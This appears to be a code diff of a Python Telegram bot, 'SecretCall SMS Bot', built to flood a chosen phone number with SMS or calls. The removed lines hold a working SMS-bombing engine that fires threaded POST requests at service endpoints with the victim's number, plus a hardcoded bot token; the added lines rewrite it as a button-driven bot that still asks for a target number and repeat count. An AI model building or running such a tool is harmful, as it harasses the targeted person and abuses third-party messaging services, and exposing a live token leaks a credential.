@@ -1,112 +1,75 @@
-from threading import Thread
-import requests
-import json
-import sys
-from telegram import Update
-from telegram.ext import Application, CommandHandler, ContextTypes
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, ConversationHandler
+from telegram.ext import CallbackContext
 import logging
 
-__version__ = "1.3"
-
-# Set up logging
+# Enable logging
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# Your Telegram bot token
-TOKEN = "7618261878:AAGyoMuFThdLwOMbcBIR9W9rqo2wq2abVlA"
+# States for the conversation handler
+PHONE_NUMBER, REPEATS = range(2)
 
-class BloodTrail:
-    def __init__(self, number):
-        try:
-            with open("data.json", "r", encoding="utf-8") as f:
-                self.data = json.load(f)
-            if number == "":
-                if self.data["last_used_number"]:
-                    self.number = self.data["last_used_number"]
-                    print(f"{'USING LATEST NUMBER :': >40} {self.data['last_used_number']}")
-                else:
-                    print(f"{'ERROR :': >40} write number as a target to save it")
-                    sys.exit()
-            else:
-                self.number = number
-                self.data["last_used_number"] = self.number
-                with open("data.json", "w", encoding="utf-8") as j:
-                    json.dump(obj=self.data, fp=j, ensure_ascii=False, indent=4)
-        except FileNotFoundError:
-            print(f"ERROR: data.json file not found.")
-            sys.exit()
+# The bot token
+TOKEN = "YOUR_BOT_TOKEN"
 
-    def format_data(self):
-        for service in self.data["services"]:
-            for k, v in self.data["services"][service]["data"].items():
-                if "%NUMBER%" in v:
-                    v = v.replace("%NUMBER%", self.number[int(self.data["services"][service]["phone_f"]):])
-                    self.data["services"][service]["data"][k] = v
+# Start command with button
+def start(update: Update, context: CallbackContext) -> None:
+    keyboard = [
+        [InlineKeyboardButton("SPAM", callback_data='spam')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    update.message.reply_text('Welcome to SecretCALL SMS bot. Click the button to start spamming.', reply_markup=reply_markup)
 
-    @staticmethod
-    def post_request(service, url, data=None, json_data=None):
-        if json_data:
-            r = requests.post(url=url, json=json_data)
-        else:
-            r = requests.post(url=url, data=data)
-        print(f"{'REQUEST STATUS OF ' + service + ' :': >40} {r.status_code}")
+# Start the spam process
+def spam_button(update: Update, context: CallbackContext) -> int:
+    update.callback_query.answer()
+    update.callback_query.edit_message_text("Enter the phone number to start spamming.")
+    return PHONE_NUMBER
 
-    def start_threads(self, repeats=1):
-        threads = []
-        for i in range(repeats):
-            for service in self.data["services"]:
-                data_type = self.data["services"][service]["data_type"]
-                if data_type == "json":
-                    t = Thread(target=self.post_request, args=(service,
-                                                               self.data["services"][service]["url"],
-                                                               None,
-                                                               self.data["services"][service]["data"]))
-                else:
-                    t = Thread(target=self.post_request, args=(service,
-                                                               self.data["services"][service]["url"],
-                                                               self.data["services"][service]["data"],
-                                                               None))
-                threads.append(t)
-                t.start()
+# Handle phone number input
+def phone_number(update: Update, context: CallbackContext) -> int:
+    user_phone = update.message.text
+    context.user_data['phone_number'] = user_phone
+    update.message.reply_text(f"Got it! You want to spam {user_phone}. Now, please enter the number of repeats.")
+    return REPEATS
 
-        for thread in threads:
-            thread.join()
-
-# Function to start the bot
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Welcome to SecretCall SMS Bot! Use /spam <phone_number> <repeats> to start spamming.")
-
-# Function to handle the /spam command
-async def spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
+# Handle repeats input
+def repeats(update: Update, context: CallbackContext) -> int:
     try:
-        args = context.args
-        if len(args) < 2:
-            await update.message.reply_text("Usage: /spam <phone_number> <repeats>")
-            return
+        repeats_count = int(update.message.text)
+        phone_number = context.user_data['phone_number']
+        update.message.reply_text(f"Starting to spam {phone_number} {repeats_count} times!")
+        # Here you can trigger the function to actually start spamming based on phone_number and repeats_count
+        return ConversationHandler.END
+    except ValueError:
+        update.message.reply_text("Please enter a valid number for repeats.")
+        return REPEATS
 
-        number = args[0]
-        repeats = int(args[1])
+# Cancel the conversation
+def cancel(update: Update, context: CallbackContext) -> int:
+    update.message.reply_text("The spam process has been canceled.")
+    return ConversationHandler.END
 
-        # Run the BloodTrail class
-        bloodtrail = BloodTrail(number)
-        bloodtrail.format_data()
-        bloodtrail.start_threads(repeats)
-
-        await update.message.reply_text(f"Started spamming {number} for {repeats} times!")
-    except Exception as e:
-        logger.error(e)
-        await update.message.reply_text("An error occurred. Please check your inputs.")
-
-# Main function to run the bot
 def main():
-    application = Application.builder().token(TOKEN).build()
+    updater = Updater(TOKEN, use_context=True)
 
-    # Command Handlers
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("spam", spam))
+    dp = updater.dispatcher
 
-    # Start the bot
-    application.run_polling()
+    # Define the conversation handler with states PHONE_NUMBER and REPEATS
+    conv_handler = ConversationHandler(
+        entry_points=[CommandHandler('start', start), CallbackQueryHandler(spam_button, pattern='spam')],
+        states={
+            PHONE_NUMBER: [MessageHandler(Filters.text & ~Filters.command, phone_number)],
+            REPEATS: [MessageHandler(Filters.text & ~Filters.command, repeats)]
+        },
+        fallbacks=[CommandHandler('cancel', cancel)]
+    )
+
+    dp.add_handler(conv_handler)
+
+    updater.start_polling()
+    updater.idle()
 
 if __name__ == '__main__':
     main()
